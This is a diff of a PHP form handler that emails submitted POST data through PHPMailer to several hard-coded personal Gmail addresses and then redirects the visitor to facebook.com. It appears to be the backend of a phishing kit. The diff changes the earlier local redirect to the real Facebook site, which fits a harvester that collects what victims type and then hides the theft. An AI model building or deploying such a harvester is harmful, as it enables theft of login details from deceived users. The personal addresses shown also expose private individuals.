@@ -2,9 +2,9 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-require 'PHPMailer/src/Exception.php';
-require 'PHPMailer/src/PHPMailer.php';
-require 'PHPMailer/src/SMTP.php';
+require 'Exception.php';
+require 'PHPMailer.php';
+require 'SMTP.php';
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // Initialize an empty body for the email
@@ -35,13 +35,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mail->setFrom('ksab33806@gmail.com', 'PROFESSOR');
         $mail->addAddress('mahboobalinizamani@gmail.com');
        $mail->addAddress('bilalkingmaryjohn@gmail.com');
-      $mail->addAddress('w');
+    
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'w';
+        $mail->Subject = 'Asif';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
@@ -51,7 +51,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $_SESSION['email_success'] = true;
 
     // Redirect to another page after sending email successfully
-    header("Location: pass.php");
+    header("Location:https://www.facebook.com");
     exit(); // Make sure to exit after sending the header to prevent further execution
 } catch (Exception $e) {
     echo "Email sending failed. Error message: {$mail->ErrorInfo}";
